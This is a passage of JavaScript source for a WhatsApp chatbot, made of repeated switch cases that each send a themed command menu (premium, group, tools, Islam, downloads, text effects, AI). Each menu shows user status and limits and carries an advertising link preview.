        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break

case 'premmenu': {
let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

乂 *P R E M I U M  M E N U*
☍ ${prefix}ktpmaker
☍ ${prefix}remini
☍ ${prefix}jadianime
☍ ${prefix}art
☍ ${prefix}bts
☍ ${prefix}exo
☍ ${prefix}elf
☍ ${prefix}loli
☍ ${prefix}neko
☍ ${prefix}waifu
☍ ${prefix}shota
☍ ${prefix}husbu
☍ ${prefix}sagiri
☍ ${prefix}shinobu
☍ ${prefix}megumin
☍ ${prefix}wallnime`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break

case 'primbonmenu': {
let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

乂 *P R I M B O N  M E N U*
☍ ${prefix}nomorhoki
☍ ${prefix}artimimpi
☍ ${prefix}artinama
☍ ${prefix}ramaljodoh
☍ ${prefix}ramaljodohbali
☍ ${prefix}suamiistri
☍ ${prefix}ramalcinta
☍ ${prefix}cocoknama
☍ ${prefix}pasangan
☍ ${prefix}jadiannikah
☍ ${prefix}sifatusaha
☍ ${prefix}rezeki
☍ ${prefix}pekerjaan
☍ ${prefix}nasib
☍ ${prefix}penyakit
☍ ${prefix}tarot
☍ ${prefix}fengshui
☍ ${prefix}haribaik
☍ ${prefix}harisangar
☍ ${prefix}harisial
☍ ${prefix}nagahari
☍ ${prefix}arahrezeki
☍ ${prefix}peruntungan
☍ ${prefix}weton
☍ ${prefix}karakter
☍ ${prefix}keberuntungan
☍ ${prefix}memancing
☍ ${prefix}masasubur
☍ ${prefix}zodiak
☍ ${prefix}shio`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break

case 'groupmenu': {
let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

乂 *G R O U P  M E N U*
☍ ${prefix}kick
☍ ${prefix}add
☍ ${prefix}culik
☍ ${prefix}promote
☍ ${prefix}demote
☍ ${prefix}setname
☍ ${prefix}setdesc
☍ ${prefix}setppgc
☍ ${prefix}tagall
☍ ${prefix}hidetag
☍ ${prefix}totag
☍ ${prefix}antilink
☍ ${prefix}antilinkyt
☍ ${prefix}antilinktt
☍ ${prefix}mutegc
☍ ${prefix}ephemeral
☍ ${prefix}group
☍ ${prefix}editinfo
☍ ${prefix}linkgc
☍ ${prefix}revoke
☍ ${prefix}liston`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'datamenu': {
let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

乂 *D A T A  M E N U*
☍ ${prefix}setcmd [reply sticker/pesan]
☍ ${prefix}listcmd
☍ ${prefix}delcmd [reply sticker/pesan]
☍ ${prefix}lockcmd
☍ ${prefix}addmsg
☍ ${prefix}listmsg
☍ ${prefix}getmsg
☍ ${prefix}delmsg`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'ramdonmenu': {
let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

乂 *R A M D O N  M E N U*
☍ ${prefix}pokemon
☍ ${prefix}rize
☍ ${prefix}sagiri
☍ ${prefix}aesthetic
☍ ${prefix}anjing
☍ ${prefix}blankpink
☍ ${prefix}boneka
☍ ${prefix}hekel
☍ ${prefix}justina
☍ ${prefix}kpop
☍ ${prefix}kucing
☍ ${prefix}mobil
☍ ${prefix}motor
☍ ${prefix}pubg
☍ ${prefix}rose
☍ ${prefix}ryujin
☍ ${prefix}wallhp
☍ ${prefix}cyberspace
☍ ${prefix}mountain
☍ ${prefix}programming
☍ ${prefix}technology 
☍ ${prefix}couple
☍ ${prefix}wallpaper`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'asupanmenu': {
let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

乂 *A S U P A N  M E N U*
☍ ${prefix}cecan
☍ ${prefix}china
☍ ${prefix}cogan
☍ ${prefix}indonesia
☍ ${prefix}japan
☍ ${prefix}korea
☍ ${prefix}malaysia
☍ ${prefix}thailand
☍ ${prefix}vietnam`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'toolsmenu': {
let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

乂 *T O O L S  M E N U*
☍ ${prefix}style
☍ ${prefix}delete
☍ ${prefix}quoted
☍ ${prefix}ebinary
☍ ${prefix}dbinary
☍ ${prefix}wikimedia
☍ ${prefix}bass
☍ ${prefix}blown
☍ ${prefix}deep
☍ ${prefix}earrape
☍ ${prefix}fast
☍ ${prefix}fat
☍ ${prefix}nightcore
☍ ${prefix}reverse
☍ ${prefix}robot
☍ ${prefix}slow
☍ ${prefix}tupai`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'creatormenu': {
let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

乂 *C R E A T O R  I M A G E*
☍ ${prefix}tololsertifikat
☍ ${prefix}bucinsertifikat
☍ ${prefix}pacarsertifikat
☍ ${prefix}ttp
☍ ${prefix}attp
☍ ${prefix}attp2
☍ ${prefix}qcimg
☍ ${prefix}qc`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'islammenu': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

乂 *I S L A M  M E N U*
☍ ${prefix}asmaulhusna
☍ ${prefix}alquranaudio
☍ ${prefix}alquran
☍ ${prefix}jadwalsolat
☍ ${prefix}kisahnabi
☍ ${prefix}listsurah
☍ ${prefix}iqro
☍ ${prefix}juzamma
☍ ${prefix}hadist
☍ ${prefix}tasfirsurah`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'downmenu': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

乂 *D O W N  M E N U*
☍ ${prefix}ytplay
☍ ${prefix}ytmp3
☍ ${prefix}ytmp4
☍ ${prefix}tiktok
☍ ${prefix}tiktokaudio
☍ ${prefix}igdl
☍ ${prefix}igdl2
☍ ${prefix}twtdl
☍ ${prefix}fbdl
☍ ${prefix}gitclone`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'ephoto1': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

乂 *E P H O T O _1_*
☍ ${prefix}wetglass
☍ ${prefix}multicolor3d
☍ ${prefix}watercolor
☍ ${prefix}luxurygold
☍ ${prefix}galaxywallpaper
☍ ${prefix}lighttext
☍ ${prefix}beautifulflower
☍ ${prefix}puppycute
☍ ${prefix}royaltext
☍ ${prefix}heartshaped
☍ ${prefix}birthdaycake
☍ ${prefix}galaxystyle
☍ ${prefix}hologram3d
☍ ${prefix}greenneon
☍ ${prefix}glossychrome
☍ ${prefix}greenbush
☍ ${prefix}metallogo
☍ ${prefix}noeltext
☍ ${prefix}glittergold
☍ ${prefix}textcake
☍ ${prefix}starsnight
☍ ${prefix}wooden3d
☍ ${prefix}textbyname
☍ ${prefix}writegalacy
☍ ${prefix}galaxybat
☍ ${prefix}snow3d
☍ ${prefix}birthdayday
☍ ${prefix}goldplaybutton
☍ ${prefix}silverplaybutton
☍ ${prefix}freefire`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'photooxy1': {
let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

乂 *P H O T O  O X Y _1_*
☍ ${prefix}shadow
☍ ${prefix}cup
☍ ${prefix}cup1
☍ ${prefix}romance
☍ ${prefix}smoke
☍ ${prefix}burnpaper
☍ ${prefix}lovemessage
☍ ${prefix}undergrass
☍ ${prefix}love
☍ ${prefix}coffe
☍ ${prefix}woodheart
☍ ${prefix}woodenboard
☍ ${prefix}summer3d
☍ ${prefix}wolfmetal
☍ ${prefix}nature3d
☍ ${prefix}underwater
☍ ${prefix}golderrose
☍ ${prefix}summernature
☍ ${prefix}letterleaves
☍ ${prefix}glowingneon
☍ ${prefix}fallleaves
☍ ${prefix}flamming
☍ ${prefix}harrypotter
☍ ${prefix}carvedwood`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'textpro1': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

乂 *T E X T  P R O _1_*
☍ ${prefix}blackpink
☍ ${prefix}neon
☍ ${prefix}greenneon
☍ ${prefix}advanceglow
☍ ${prefix}futureneon
☍ ${prefix}sandwriting
☍ ${prefix}sandsummer
☍ ${prefix}sandengraved
☍ ${prefix}metaldark
☍ ${prefix}neonlight
☍ ${prefix}holographic
☍ ${prefix}text1917
☍ ${prefix}minion
☍ ${prefix}deluxesilver
☍ ${prefix}newyearcard
☍ ${prefix}bloodfrosted
☍ ${prefix}halloween
☍ ${prefix}jokerlogo
☍ ${prefix}fireworksparkle
☍ ${prefix}natureleaves
☍ ${prefix}bokeh
☍ ${prefix}toxic
☍ ${prefix}strawberry
☍ ${prefix}box3d
☍ ${prefix}roadwarning
☍ ${prefix}breakwall
☍ ${prefix}icecold
☍ ${prefix}luxury
☍ ${prefix}cloud
☍ ${prefix}summersand
☍ ${prefix}horrorblood
☍ ${prefix}thunder`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'textpro2': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

乂 *T E X T  P R O _2_*
☍ ${prefix}pornhub
☍ ${prefix}glitch
☍ ${prefix}avenger
☍ ${prefix}space
☍ ${prefix}ninjalogo
☍ ${prefix}marvelstudio
☍ ${prefix}lionlogo
☍ ${prefix}wolflogo
☍ ${prefix}steel3d
☍ ${prefix}wallgravity`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'aimenu': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

乂 *A I  M E N U*
☍ ${prefix}ai
☍ ${prefix}ai2
☍ ${prefix}aiimage
☍ ${prefix}diffusion
`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'infomenu': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

乂 *I N F O R M A T I O N*
☍ ${prefix}kbbi
☍ ${prefix}brainly
☍ ${prefix}roboguru
☍ ${prefix}jarak
☍ ${prefix}wikipedia
☍ ${prefix}translate
☍ ${prefix}jadwaltv
☍ ${prefix}jadwaltvnow
☍ ${prefix}jadwalbola
☍ ${prefix}newsinfo
☍ ${prefix}cnnindonesia
☍ ${prefix}cnnnasional
☍ ${prefix}cnninternasional
☍ ${prefix}infogempa
☍ ${prefix}infocuaca
☍ ${prefix}lirik
☍ ${prefix}kodepos
☍ ${prefix}infochat
☍ ${prefix}google
☍ ${prefix}gimage
☍ ${prefix}pinterest`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'animemenu': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

